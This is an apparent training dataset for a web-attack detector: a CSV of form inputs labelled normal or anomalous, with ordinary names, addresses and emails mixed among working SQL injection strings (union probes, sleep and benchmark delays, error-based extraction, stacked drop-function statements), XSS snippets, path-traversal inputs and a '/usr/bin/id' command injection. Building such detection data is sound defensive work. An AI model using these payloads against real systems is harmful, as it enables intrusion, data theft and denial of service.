payload,length,attack_type,label
vega de valcarce,16,norm,norm
42218,5,norm,norm
3748443978921311,16,norm,norm
4857,4,norm,norm
"-5224') where 1962=1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",87,sqli,anom
43791,5,norm,norm
1')) as wjfj where 3802=3802;if(8574=7534) select 8574 else drop function nxbe--,80,sqli,anom
3483759032039074,16,norm,norm
-3582) where 5873=5873 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,226,sqli,anom
culubret lluss,14,norm,norm
chimenea,8,norm,norm
"1',row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)",200,sqli,anom
6702564951251728,16,norm,norm
7591,4,norm,norm
48310,5,norm,norm
"-7887') union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",75,sqli,anom
jayavant,8,norm,norm
riggsbee,8,norm,norm
8711764865979361,16,norm,norm
25,2,norm,norm
"1"" where 7005=7005;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",103,sqli,anom
17751,5,norm,norm
"1' union all select null,null,null,null,null#",45,sqli,anom
"-9082 union all select 9858,9858,9858,9858,9858,9858--",54,sqli,anom
espinoza blancarte,18,norm,norm
charlots7@e-b-s.bm,18,norm,norm
"1' in boolean mode) or 8514=benchmark(5000000,md5(0x544d5a4c))#",63,sqli,anom
"1'+(select gblp where 6768=6768;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",119,sqli,anom
1%'));if(7899=7899) select 7899 else drop function zbbp--,57,sqli,anom
sanromn casuso,14,norm,norm
efrn,4,norm,norm
-9389') order by 1#,19,sqli,anom
"calle de piquer, 8,",19,norm,norm
palmario,8,norm,norm
"1 where 4477=4477 union all select null,null,null,null,null,null,null,null,null,null--",86,sqli,anom
"1') as ywtu where 3009=3009 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",122,sqli,anom
"1%"");select (case when (1898=4705) then 1898 else 1/(select 0) end)--",69,sqli,anom
caruth5@wave.com.pt,19,norm,norm
introduccin,11,norm,norm
-5861') or 1581=2611 and ('mvjh' like 'mvjh,43,sqli,anom
"-5187"") union all select 3373,3373#",35,sqli,anom
1'+(select brgo where 9100=9100 or 4240=(select 4240 from pg_sleep(5))--,72,sqli,anom
"-3347'+(select xuzs where 1076=1076 union all select 1076,1076,1076,1076,1076--",79,sqli,anom
lesaka,6,norm,norm
gloriano,8,norm,norm
ambligonio,10,norm,norm
07310,5,norm,norm
carceln,7,norm,norm
"-4865 where 1386=1386 union all select 1386,1386,1386,1386#",59,sqli,anom
petrie3@menorca.com.kp,22,norm,norm
guaza de campos,15,norm,norm
g8629e8d9r,10,norm,norm
"1%"") rlike (select (case when (7736=7642) then 1 else 0x28 end)) and (""%""=""",75,sqli,anom
"travesia castilla, 92, 5-g",26,norm,norm
"-3031"" union all select 2681#",29,sqli,anom
"1 where 7522=7522 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",175,sqli,anom
escobedo,8,norm,norm
(select (case when (6986=6986) then 6986 else 6986*(select 6986 from mysql.db) end)),84,sqli,anom
"1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('cimm' like 'cimm",105,sqli,anom
1');select pg_sleep(5),22,sqli,anom
"calle s'arraval, 114",20,norm,norm
"1') or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",155,sqli,anom
"-1171' union all select 3958,3958,3958,3958,3958--",50,sqli,anom
1)) union all select null--,27,sqli,anom
"1"") as kndn where 9314=9314;iif(6307=2459,1,1/0)",48,sqli,anom
"1"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""yrgy"" like ""yrgy",89,sqli,anom
1));begin user_lock.sleep(5); end--,35,sqli,anom
c/ sarasate 143,15,norm,norm
tissot@twinjet.bs,17,norm,norm
1'+(select mrdi where 7451=7451 and 8594=(select 8594 from pg_sleep(5))--,73,sqli,anom
sadurn corvera,14,norm,norm
trinidad,8,norm,norm
llull valls,11,norm,norm
17103014f,9,norm,norm
607,3,norm,norm
"1%'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",159,sqli,anom
lcar,4,norm,norm
1';begin user_lock.sleep(5); end and 'huti' like 'huti,54,sqli,anom
81568460h,9,norm,norm
"1')) union all select null,null,null,null,null--",48,sqli,anom
5599,4,norm,norm
hoyt,4,norm,norm
-1866')) as cwtv where 3295=3295 order by 1--,45,sqli,anom
consalve,8,norm,norm
mendie,6,norm,norm
"1%"" and elt(1210=1210,sleep(5)) and ""%""=""",41,sqli,anom
"<body background=""javascript:document.cookie=true;"">",52,xss,anom
"1'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('bfrq' like 'bfrq",135,sqli,anom
baggerma,8,norm,norm
boagne,6,norm,norm
"1%"" or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",79,sqli,anom
perla,5,norm,norm
zoratti,7,norm,norm
silena,6,norm,norm
40355743n,9,norm,norm
1) where 8041=8041;select (case when (5970=2200) then 1 else 5970*(select 5970 from master..sysdatabases) end)--,112,sqli,anom
aseguir,7,norm,norm
albina,6,norm,norm
adalino,7,norm,norm
"xiprer 61, 2-a",14,norm,norm
"1) union all select null,null,null,null,null,null#",50,sqli,anom
drohocka@baybay.mq,18,norm,norm
........................etcpasswd,33,path-traversal,anom
flori@casabolsa43.np,20,norm,norm
2820,4,norm,norm
tardn,5,norm,norm
1193655475933803,16,norm,norm
laureano,8,norm,norm
54716363f,9,norm,norm
encebra,7,norm,norm
"de gaspar cassado, 134,",23,norm,norm
lakshmin,8,norm,norm
"1'||(select 'xtcb' where 5240=5240;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",137,sqli,anom
kava_ivic@comercioenlacalle.info,32,norm,norm
01e9$6d5l7,10,norm,norm
95726092t,9,norm,norm
willeke5,8,norm,norm
mckenney,8,norm,norm
4075,4,norm,norm
"1')) as egsj where 3447=3447;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",145,sqli,anom
sabionda,8,norm,norm
"1"") and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""pfea""=""pfea",122,sqli,anom
"1' in boolean mode) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)#",221,sqli,anom
bertra canamasa,15,norm,norm
04420,5,norm,norm
"calle daniel florido rodriguez, 105, 2?f",40,norm,norm
"1'+(select 'vkis' where 3712=3712 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))+'",223,sqli,anom
"1) as itvm where 1482=1482;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",111,sqli,anom
5452,4,norm,norm
pacheco_cox4@frenchpolynesia.com.ru,35,norm,norm
"-4329') union all select 1353,1353,1353,1353,1353,1353#",55,sqli,anom
massimo,7,norm,norm
80725413j,9,norm,norm
"1""))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""jgoq""=""jgoq",126,sqli,anom
87167407y,9,norm,norm
"c/ valtravieso s/n,",19,norm,norm
"1) as kaew where 2658=2658;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",94,sqli,anom
9435,4,norm,norm
"-3971%'))) or elt(1032=1032,3623) and ((('%'='",46,sqli,anom
rancar,6,norm,norm
24120558k,9,norm,norm
22147,5,norm,norm
"1"" rlike (select * from (select(sleep(5)))sgvo) and ""wcze""=""wcze",64,sqli,anom
"1)) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((2748=2748",122,sqli,anom
hanlon@importaproductosespaoles.cs,34,norm,norm
48549953n,9,norm,norm
"carrer pompeu fabra, 151,",25,norm,norm
<img id=xss src=&{alert('xss');};>,34,xss,anom
rebotadera,10,norm,norm
pepe.whitehead@jaxiaabogadosyeconomistas.nr,43,norm,norm
entrala,7,norm,norm
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('njnr'='njnr",111,sqli,anom
7774409448573763,16,norm,norm
"calle cruz de caravaca, 171,",28,norm,norm
"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('ngwt'='ngwt",162,sqli,anom
21762453z,9,norm,norm
1 where 4785=4785 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,222,sqli,anom
49449729m,9,norm,norm
"calle sant joan, 123,",21,norm,norm
c/ sant gonal 166 9-b,21,norm,norm
75,2,norm,norm
"1) where 3936=3936;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",103,sqli,anom
"1"" union all select null--",26,sqli,anom
"-7491"") as cnrn where 3635=3635 order by 1#",43,sqli,anom
sathe9,6,norm,norm
pardos@barcafedaniss.co,23,norm,norm
"1'+(select 'uijv' where 7279=7279 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",109,sqli,anom
15256,5,norm,norm
1'||(select 'tfqg' from dual where 9862=9862 and (select * from (select(sleep(5)))gcrr)#,88,sqli,anom
niwinska@estudiodeyoga.td,25,norm,norm
gil,3,norm,norm
"1"") as yphz where 8174=8174 union all select null,null,null,null,null,null,null--",81,sqli,anom
nierola porcel,14,norm,norm
"1)) as xzcl where 2332=2332;select benchmark(5000000,md5(0x714e4153))#",70,sqli,anom
morneau,7,norm,norm
47901295t,9,norm,norm
corazoncill2,12,norm,norm
tilton,6,norm,norm
aimar taulats,13,norm,norm
mallett-shibata@tisanuro.cc,27,norm,norm
"-5507' or elt(1032=1032,3623) and 'ndqw'='ndqw",46,sqli,anom
-3752%' union all select 9351--,31,sqli,anom
piesa-diestel@hacia.tz,22,norm,norm
$vastedad,9,norm,norm
"calle miramar, 169,",19,norm,norm
japan,5,norm,norm
05296,5,norm,norm
lyndal,6,norm,norm
"""alert(1)"">",11,xss,anom
-2154%' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and '%'=',248,sqli,anom
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",93,sqli,anom
94731203e,9,norm,norm
symen,5,norm,norm
16812,5,norm,norm
"-9721' or elt(9511=9238,9238)",29,sqli,anom
1632,4,norm,norm
cmitre,6,norm,norm
9654,4,norm,norm
7428930336953992,16,norm,norm
adoree-halsted1@estoespresto.af,31,norm,norm
"-8633"" or 5099=5974",19,sqli,anom
swearing,8,norm,norm
sopista,7,norm,norm
"1""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""xtyt""=""xtyt",119,sqli,anom
"1' in boolean mode) and make_set(7804=3315,3315)#",49,sqli,anom
19,2,norm,norm
raina.schiavelli@hosterialasmajadillas.de,41,norm,norm
6ho7rca5u16,11,norm,norm
hoggatt,7,norm,norm
puerto de bjar,14,norm,norm
"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",76,sqli,anom
"1"" where 3434=3434;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",115,sqli,anom
"1'+(select 'sppw' where 1677=1677 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))+'",139,sqli,anom
9177356763269227,16,norm,norm
75582707s,9,norm,norm
c/ pampa 76,11,norm,norm
"1) as lejp where 5238=5238 union all select null,null,null,null,null#",69,sqli,anom
"<base href=""javascript:alert('xss');//"">",40,xss,anom
15107,5,norm,norm
<script>alert('xssya');</script>,32,xss,anom
-3956') or (8459=8459)*4906 and ('rflo' like 'rflo,50,sqli,anom
6rce8o,6,norm,norm
polson,6,norm,norm
06105,5,norm,norm
1'+(select 'stsu' where 2386=2386 or sleep(5)#,46,sqli,anom
"-4694%""))) union all select 9178,9178,9178,9178,9178--",54,sqli,anom
19144,5,norm,norm
1));begin user_lock.sleep(5); end and ((6874=6874,49,sqli,anom
mc'morral obrist,16,norm,norm
"1%'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",76,sqli,anom
"-4397'))) or make_set(9354=9354,7185) and ((('omqt'='omqt",57,sqli,anom
amberina,8,norm,norm
"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",64,sqli,anom
bly7,4,norm,norm
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'ixzr'='ixzr,251,sqli,anom
"1"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",63,sqli,anom
abdn,4,norm,norm
quint,5,norm,norm
29574909z,9,norm,norm
montaesismo,11,norm,norm
-9660)) or 9762=9698,20,sqli,anom
"1') where 3271=3271 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",217,sqli,anom
"1') or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",79,sqli,anom
"1'||(select 'bnaz' from dual where 7168=7168 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",197,sqli,anom
"1))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,sqli,anom
c1s92be4e29,11,norm,norm
translaticio,12,norm,norm
gelber serarols,15,norm,norm
"-9389' where 5713=5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",81,sqli,anom
"1'+(select xwcl where 7997=7997;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",116,sqli,anom
"1 where 8045=8045 union all select null,null,null--",51,sqli,anom
verdugo olalla,14,norm,norm
46760006v,9,norm,norm
1));select (case when (9696=2874) then 1 else 9696*(select 9696 from master..sysdatabases) end)--,97,sqli,anom
"1' in boolean mode) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",121,sqli,anom
feodora8,8,norm,norm
yahed,5,norm,norm
brana@housemovie.id,19,norm,norm
b1a838c2fal8,12,norm,norm
"1%') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('%'='",76,sqli,anom
"1""))) union all select null,null,null,null,null,null,null--",59,sqli,anom
"1')) as bwjl where 8538=8538 union all select null,null,null,null,null,null,null#",81,sqli,anom
ishida lasalle,14,norm,norm
"1"")) as dfwi where 9703=9703 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",123,sqli,anom
33455,5,norm,norm
calle tresmall 154,18,norm,norm
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'hhbh'='hhbh",116,sqli,anom
9mbaicin,8,norm,norm
bembibre,8,norm,norm
travs elias,11,norm,norm
1')) as zqeg where 4729=4729 and (1098=9682)*9682--,51,sqli,anom
"c/ de la riera d'horta 105, 5?h",31,norm,norm
"-6123"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""zuzx""=""zuzx",116,sqli,anom
"1%')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((('%'='",102,sqli,anom
bebedizo,8,norm,norm
matar,5,norm,norm
swinkels,8,norm,norm
1) where 1090=1090 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,114,sqli,anom
friels-devereaux3@enformetera.com.fr,36,norm,norm
"1 where 6434=6434;select benchmark(5000000,md5(0x4c4d6142))--",61,sqli,anom
valdeolmillos,13,norm,norm
"-6599"")) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",77,sqli,anom
kops@estarencasa.bb,19,norm,norm
1'))) or sleep(5)#,18,sqli,anom
escuder liveris,15,norm,norm
8965,4,norm,norm
44143,5,norm,norm
6862303368797459,16,norm,norm
"1%"") and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""%""=""",171,sqli,anom
"1"";select benchmark(5000000,md5(0x4c4d6142)) and ""vzft""=""vzft",61,sqli,anom
"el vito, 90",11,norm,norm
sumahya,7,norm,norm
"1%"" and 7533=7533 and ""%""=""",27,sqli,anom
"1"") where 6964=6964;select count(*) from generate_series(1,5000000)--",69,sqli,anom
"-5509%""))) union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",79,sqli,anom
corbera d'ebre,14,norm,norm
1%');select case when 7717=7717 then 1 else null end--,54,sqli,anom
"1%');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('%'='",74,sqli,anom
"1"")) union all select null,null--",33,sqli,anom
mortandad,9,norm,norm
hills,5,norm,norm
santaniello_tabernero@enfuerteventura.com.ni,44,norm,norm
"1%"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""%""=""",78,sqli,anom
50248210h,9,norm,norm
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('gfll'='gfll",155,sqli,anom
22470,5,norm,norm
cercs,5,norm,norm
"1)) union all select null,null,null,null#",41,sqli,anom
/////////{file},15,path-traversal,anom
"c/ universidad laboral 193,",27,norm,norm
"1';select benchmark(5000000,md5(0x714e4153))#",45,sqli,anom
legros@muchapolicia.tw,22,norm,norm
07250,5,norm,norm
0260l6st116,11,norm,norm
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'cdgm' like 'cdgm",180,sqli,anom
fiscal,6,norm,norm
a)|/usr/bin/id,14,cmdi,anom
francene,8,norm,norm
"-4091""))) union all select 6694,6694--",38,sqli,anom
carmia,6,norm,norm
file:/boot.ini,14,path-traversal,anom
5408940503153342,16,norm,norm
c1lab8,6,norm,norm
"1'+(select 'tzey' where 4491=4491 union all select null,null,null,null,null,null,null,null--",92,sqli,anom
calle la fuente 116 2?e,23,norm,norm
juneho,6,norm,norm
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",87,sqli,anom
"<select id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",120,xss,anom
38847166m,9,norm,norm
-4001')) or 5634=4044--,23,sqli,anom
06260,5,norm,norm
trikonis_ruschel@beatrizbalado.zw,33,norm,norm
9553145655570533,16,norm,norm
"-2287')) union all select 1200,1200,1200,1200,1200#",51,sqli,anom
1ed6at0zacin,12,norm,norm
alcoberro cruells,17,norm,norm
"-9840)) as thod where 4790=4790 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",228,sqli,anom
lerumeur@phd-photodecor.sj,26,norm,norm
"1) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (1624=1624",107,sqli,anom
